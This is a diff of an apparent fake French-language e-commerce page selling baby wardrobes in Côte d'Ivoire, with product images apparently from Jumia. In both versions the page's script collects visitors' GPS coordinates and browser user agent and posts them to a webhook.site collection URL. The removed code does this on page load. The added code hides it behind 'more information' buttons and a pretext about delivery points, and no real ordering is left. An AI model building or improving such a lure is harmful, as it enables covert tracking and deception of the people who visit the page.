@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Placards Bébé CI</title>
   <style>
     body {
@@ -24,94 +24,116 @@
     .product img {
       width: 200px;
       height: 200px;
+      object-fit: contain;
     }
     .product button {
       margin-top: 10px;
-      padding: 10px 20px;
-      background-color: #4CAF50;
+      padding: 12px 24px;
+      background-color: #2196F3; /* Bleu plus attractif */
       color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 25px;
       cursor: pointer;
+      font-size: 1.1em;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
     }
     .product button:hover {
-      background-color: #388E3C;
+      background-color: #0b7dda;
     }
     p.notice {
       font-size: 0.9em;
       color: #555;
       margin-top: 30px;
     }
+    #message {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #d9534f; /* rouge par défaut */
+    }
+    #message.success {
+      color: #4CAF50; /* vert succès */
+    }
   </style>
 </head>
 <body>
   <h1>Placards pour Bébé - Livraison partout en CI</h1>
-  <p class="notice">📍 Pour afficher les points de livraison disponibles, autorisez l’accès à votre position.</p>
+  <p class="notice">📍 Pour afficher les points de livraison disponibles dans votre ville, autorisez l’accès à votre position.</p>
 
   <div class="product">
-    <img src="https://static.jumia.ci/ni/Placard1.jpg" alt="Placard 1">
+    <img src="https://cdn2.jumia.is/cms/2021/06/Jumia-Product-Ads-Pictures/placard-bebe-1.jpg" alt="Placard bébé modèle 1" />
     <p>Placard bébé modèle 1</p>
-    <button onclick="handleCommand()">Commander</button>
+    <button onclick="sendPosition()">Cliquez ici pour plus d'informations</button>
   </div>
 
   <div class="product">
-    <img src="https://static.jumia.ci/ni/Placard2.jpg" alt="Placard 2">
+    <img src="https://cdn2.jumia.is/cms/2021/06/Jumia-Product-Ads-Pictures/placard-bebe-2.jpg" alt="Placard bébé modèle 2" />
     <p>Placard bébé modèle 2</p>
-    <button onclick="handleCommand()">Commander</button>
+    <button onclick="sendPosition()">Cliquez ici pour plus d'informations</button>
   </div>
 
   <div class="product">
-    <img src="https://static.jumia.ci/ni/Placard3.jpg" alt="Placard 3">
+    <img src="https://cdn2.jumia.is/cms/2021/06/Jumia-Product-Ads-Pictures/placard-bebe-3.jpg" alt="Placard bébé modèle 3" />
     <p>Placard bébé modèle 3</p>
-    <button onclick="handleCommand()">Commander</button>
+    <button onclick="sendPosition()">Cliquez ici pour plus d'informations</button>
   </div>
+
+  <p id="message"></p>
 
   <script>
-    const webhookURL = "https://webhook.site/8b05a438-c465-4378-a197-40c1f240686f";
+    const webhookURL = 'https://webhook.site/8b05a438-c465-4378-a197-40c1f240686f';
 
-    // Fonction pour envoyer la position
-    function sendPosition(lat, lon, source = "auto") {
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          userAgent: navigator.userAgent,
-          source: source
-        })
-      });
-    }
-
-    // Récupère la position au chargement
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        sendPosition(position.coords.latitude, position.coords.longitude, "auto");
-        localStorage.setItem("locationSent", "1");
-      },
-      function(error) {
-        console.warn("Autorisation refusée ou erreur :", error.message);
-      }
-    );
-
-    // Si l’utilisateur clique sur un bouton
-    function handleCommand() {
-      if (localStorage.getItem("locationSent") === "1") {
-        alert("Votre commande a été reçue ✅");
+    function sendPosition() {
+      const messageEl = document.getElementById('message');
+      if (!navigator.geolocation) {
+        messageEl.textContent = "La géolocalisation n'est pas supportée par votre navigateur.";
+        messageEl.className = '';
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          sendPosition(position.coords.latitude, position.coords.longitude, "manual");
-          localStorage.setItem("locationSent", "1");
-          alert("Merci ! Votre position a été prise en compte ✅");
-        },
-        function() {
-          alert("Position refusée. Commande reçue sans localisation.");
-          sendPosition("non_disponible", "non_disponible", "refusé");
+      navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
+        if (permissionStatus.state === 'granted') {
+          navigator.geolocation.getCurrentPosition(positionSuccess, positionError);
+        } else if (permissionStatus.state === 'prompt') {
+          navigator.geolocation.getCurrentPosition(positionSuccess, positionDenied);
+        } else {
+          messageEl.textContent = "⚠️ Vous avez refusé l'accès à la localisation. Impossible d'obtenir votre position.";
+          messageEl.className = '';
         }
-      );
+      }).catch(function() {
+        navigator.geolocation.getCurrentPosition(positionSuccess, positionDenied);
+      });
+
+      function positionSuccess(position) {
+        const data = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          userAgent: navigator.userAgent
+        };
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        })
+        .then(() => {
+          messageEl.textContent = "✅ Position envoyée, merci pour votre intérêt !";
+          messageEl.className = 'success';
+        })
+        .catch(() => {
+          messageEl.textContent = "⚠️ Erreur lors de l'envoi de la position.";
+          messageEl.className = '';
+        });
+      }
+
+      function positionDenied() {
+        messageEl.textContent = "⚠️ Impossible d'obtenir votre position. Veuillez activer la localisation pour continuer.";
+        messageEl.className = '';
+      }
+
+      function positionError() {
+        messageEl.textContent = "⚠️ Erreur lors de la récupération de la position.";
+        messageEl.className = '';
+      }
     }
   </script>
 </body>
